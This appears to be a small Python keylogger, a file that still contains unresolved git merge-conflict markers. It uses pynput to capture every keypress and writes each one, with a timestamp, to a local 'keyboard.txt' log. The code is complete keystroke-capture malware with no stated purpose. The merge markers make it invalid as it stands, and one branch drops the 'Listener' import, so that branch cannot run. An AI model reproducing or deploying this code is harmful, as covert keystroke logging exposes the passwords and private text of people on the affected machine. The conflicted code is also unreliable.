<<<<<<< HEAD
from pynput.keyboard import Listener
=======
from pynput.keyboard import Key
>>>>>>> d9bd5e374f4550fbd9b0fabc6311391aa507bb83
import logging

logging.basicConfig(filename=("keyboard.txt"),
                    level=logging.DEBUG, format='["%(asctime)s", %(message)s]')

def on_press(key):
    logging.info('"{0}"'.format(key))

with Listener(on_press=on_press) as listener :
    listener.join()
<<<<<<< HEAD

=======
>>>>>>> d9bd5e374f4550fbd9b0fabc6311391aa507bb83
